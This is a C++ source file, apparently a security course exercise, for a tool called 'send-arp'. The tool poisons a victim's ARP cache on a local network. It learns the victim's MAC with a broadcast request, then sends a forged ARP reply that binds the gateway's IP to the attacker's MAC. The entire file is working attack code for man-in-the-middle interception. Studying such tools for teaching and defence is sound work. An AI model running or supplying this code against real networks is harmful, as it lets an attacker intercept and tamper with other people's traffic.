#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getMacaddr.h"
#include "getIPv4addr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)
//Sender는 보통 Victim이라고도 함
//Target은 일반적으로 gateway임
void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	const char* dev = argv[1];//store interface
	
	/*
		get attacker's mac addr and ip addr
	*/
	uint8_t mac_addr[MAC_LEN];//store src mac addr
	uint8_t ip_addr[IP_LEN];//store src ip addr
	getMacaddr(dev,mac_addr);
	char mac_buf[20];//store src mac addr as string
	char ip_buf[20];//store src ip addr as string
    sprintf(mac_buf, "%02x:%02x:%02x:%02x:%02x:%02x", mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);//change mac addr nums to string
    printf("Attacker MAC address: %s\n",mac_buf);
	getIPv4addr(dev,ip_addr);
	//printf("IPv4: %u.%u.%u.%u\n",ip_addr[0],ip_addr[1],ip_addr[2],ip_addr[3]);
	sprintf(ip_buf,"%u.%u.%u.%u",ip_addr[0],ip_addr[1],ip_addr[2],ip_addr[3]);//change ip addr from nums to string
	printf("attacker ip: %s\n",ip_buf);
	
	/*
		send a normal request packet to know sender's mac address
	*/
	char errbuf[PCAP_ERRBUF_SIZE];
	EthArpPacket reqPacket;//store request packet 
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	int i=2;
	while(i<argc){
	reqPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//broadcast adress to send the packet to all of hosts
	reqPacket.eth_.smac_ = Mac(mac_buf);
	reqPacket.eth_.type_ = htons(EthHdr::Arp);
	reqPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	reqPacket.arp_.pro_ = htons(EthHdr::Ip4);
	reqPacket.arp_.hln_ = Mac::SIZE;
	reqPacket.arp_.pln_ = Ip::SIZE;
	reqPacket.arp_.op_ = htons(ArpHdr::Request);
	reqPacket.arp_.smac_ = Mac(mac_buf);
	reqPacket.arp_.sip_ = htonl(Ip(ip_buf));
	reqPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
	reqPacket.arp_.tip_ = htonl(Ip(argv[i]));//

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reqPacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}

	/*
		receive packet that include sender's mac addr
	*/
	struct pcap_pkthdr* header;
	const u_char* packet;
	res = pcap_next_ex(handle, &header, &packet);
	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
		return -1;
	}
	//printf("%u bytes captured\n", header->caplen);

	char sender_mac[20];
	sprintf(sender_mac,"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",packet[38],packet[39],packet[40],packet[41],packet[42],packet[43]);
	printf("sender's mac addr1: %s\n",sender_mac);
	sprintf(sender_mac,"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",packet[6],packet[7],packet[8],packet[9],packet[10],packet[11]);
	printf("sender's mac addr2: %s\n",sender_mac);

	/*
		make a ARP infection packet
	*/
	//up date arp table using ARP_header's smac&sip
	EthArpPacket infPacket;
	infPacket.eth_.dmac_ = Mac(sender_mac);//sender mac addr
	infPacket.eth_.smac_ = Mac(mac_buf);//attacker mac addr
	infPacket.eth_.type_ = htons(EthHdr::Arp);
	infPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	infPacket.arp_.pro_ = htons(EthHdr::Ip4);
	infPacket.arp_.hln_ = Mac::SIZE;
	infPacket.arp_.pln_ = Ip::SIZE;
	infPacket.arp_.op_ = htons(ArpHdr::Reply);
	infPacket.arp_.smac_ = Mac(mac_buf);//attacker mac addr
	infPacket.arp_.sip_ = htonl(Ip(argv[i+1]));//target(getway) ip addr
	infPacket.arp_.tmac_ = Mac(sender_mac);//sender mac adr
	infPacket.arp_.tip_ = htonl(Ip(argv[i]));//sender ip addr

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infPacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}
	i+=2;
	}


	pcap_close(handle);

	return 0;
	
	

	

	//ARP request to get sender's MAC address

	

}
